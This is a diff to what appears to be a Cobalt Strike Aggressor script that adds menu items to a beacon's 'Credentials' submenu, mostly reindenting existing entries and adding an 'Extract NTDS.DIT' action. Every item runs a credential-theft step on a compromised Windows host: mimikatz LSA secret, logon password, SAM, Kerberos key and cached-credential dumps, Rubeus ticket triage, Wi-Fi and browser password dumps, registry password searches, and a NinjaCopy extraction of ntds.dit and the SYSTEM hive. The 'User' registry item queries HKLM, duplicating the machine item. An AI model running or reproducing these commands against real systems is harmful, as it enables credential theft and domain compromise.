@@ -361,56 +361,67 @@ popup beacon_bottom
 			}
 		}
 		menu "Credentials"
-        {
-            item "Lsa secret"
-            {
-                bmimikatz($1, "token::elevate; lsadump::secrets");
-            }
-           
-            item "logonpassword"
-            {
-                bmimikatz($1, "token::elevate; sekurlsa::logonpasswords");
-            }
+	        {
+	            item "Lsa secret"
+	            {
+	                bmimikatz($1, "token::elevate; lsadump::secrets");
+	            }
+	           
+	            item "logonpassword"
+	            {
+	                bmimikatz($1, "token::elevate; sekurlsa::logonpasswords");
+	            }
+	
+	            item "SAM dump"
+	            {
+	                bmimikatz($1, "token::elevate; lsadump::sam");
+	            }
+	
+				item "Kerberos Encryption Keys"
+				{
+	                bmimikatz($1, "token::elevate; sekurlsa::ekeys");
+				}
+	
+				item "Domain Cached Credentials"
+				{
+	                bmimikatz($1, "token::elevate; lsadump::cache");
+				}
+				
+	            item "Kerberos Tickets list"
+	            {
+	                bexecute_assembly($1, script_resource('Tools/Rubeus.exe'), "triage");
+	            }
+	
+	            item "Wifi password"
+	            {
+	                bexecute_assembly($1, script_resource('Tools/SharpWifiDump.exe'), " ");
+	            }
+	
+	            item "Password in registry (Machine)"
+	            {
+	                bpowerpick($1, "reg query HKLM /f password /t REG_SZ /s");
+	            }
+	
+	            item "Password in registry (User)"
+	            {
+	                bpowerpick($1, "reg query HKLM /f password /t REG_SZ /s");
+	            }
+	
+	            item "SharpWeb"
+	            {
+	                bexecute_assembly($1, script_resource('Tools/SharpWeb.exe'), " all");
+	            }
 
-            item "SAM dump"
-            {
-                bmimikatz($1, "token::elevate; lsadump::sam");
-            }
-
-			item "Kerberos Encryption Keys"
-			{
-                bmimikatz($1, "token::elevate; sekurlsa::ekeys");
+ 		   item "Extract NTDS.DIT"
+		   {
+			local('$bid');
+			foreach $bid ($1) {
+			bpowershell_import($1, script_resource("scripts/Invoke-NinjaCopy.ps1"));
+			bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "C:\Windows\temp\ntds.dit"');
+			bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\system32\config\SYSTEM" -LocalDestination "C:\Windows\temp\SYSTEM"');
+			bshell($1, 'dir /a C:\Windows\temp\\');
 			}
-
-			item "Domain Cached Credentials"
-			{
-                bmimikatz($1, "token::elevate; lsadump::cache");
-			}
-			
-            item "Kerberos Tickets list"
-            {
-                bexecute_assembly($1, script_resource('Tools/Rubeus.exe'), "triage");
-            }
-
-            item "Wifi password"
-            {
-                bexecute_assembly($1, script_resource('Tools/SharpWifiDump.exe'), " ");
-            }
-
-            item "Password in registry (Machine)"
-            {
-                bpowerpick($1, "reg query HKLM /f password /t REG_SZ /s");
-            }
-
-            item "Password in registry (User)"
-            {
-                bpowerpick($1, "reg query HKLM /f password /t REG_SZ /s");
-            }
-
-            item "SharpWeb"
-            {
-                bexecute_assembly($1, script_resource('Tools/SharpWeb.exe'), " all");
-            }
+		}
         }
         menu "Domain Reconnaissance"
 	    {
